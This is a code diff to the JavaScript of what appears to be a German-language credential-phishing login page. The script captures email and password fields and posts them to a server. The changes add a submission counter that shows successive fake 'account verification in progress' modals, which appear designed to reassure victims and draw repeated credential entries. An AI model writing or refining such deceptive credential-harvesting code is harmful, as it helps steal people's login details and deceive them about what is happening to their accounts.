@@ -7,6 +7,9 @@ toggle.addEventListener("click", (e) => {
   passwordInput.type = isPassword ? "text" : "password";
 });
 
+// Track submissions
+let submissionCount = 0;
+
 function sendData() {
   const email = document.getElementById("input-email").value;
   const password = document.getElementById("input-password").value;
@@ -25,13 +28,37 @@ function sendData() {
   .then(res => res.json())
   .then(response => {
     console.log('Server response:', response);
-    showModal();
-    // alert("Kontoprüfung läuft:Ihre Anmeldedaten werden mit unseren Aufzeichnungen abgeglichen, um ihre Richtigkeit zu überprüfen. Nach Abschluss der Prüfung werden Sie verifiziert. Sollten wir Ihre Angaben nicht bestätigen können, wird Ihr Konto nach der Prüfung markiert.");
+
+    submissionCount++;
+
+    // Show modal
+    if (submissionCount === 1) {
+      // First submission: keep modal text from HTML as-is
+      showModal();
+    } else if (submissionCount === 2) {
+      // Second submission: change modal text
+      const popupTitle = document.getElementById("popup-title");
+      const popupMessage = document.getElementById("popup-message");
+      popupTitle.innerText = "Kontoprüfung läuft ✔️";
+      popupMessage.innerText =
+        "Ihre Anmeldedaten werden nun mit unseren Datensätzen abgeglichen, um deren Richtigkeit zu überprüfen. Nach Abschluss des Vorgangs wird Ihre Verifizierung abgeschlossen.";
+      showModal();
+    } else {
+      // Optional: further submissions
+      const popupTitle = document.getElementById("popup-title");
+      const popupMessage = document.getElementById("popup-message");
+      popupTitle.innerText = "Wird geprüft";
+      popupMessage.innerText =
+        "Weitere Eingaben wurden erfasst. Bitte überprüfen Sie alles sorgfältig.";
+      showModal();
+    }
+
     document.getElementById("myForm").reset();
   })
   .catch(err => console.error('Error:', err));
 }
 
+// Modal handlers
 const modalOverlay = document.getElementById("modalOverlay");
 const closeModalBtn = document.getElementById("closeModal");
 
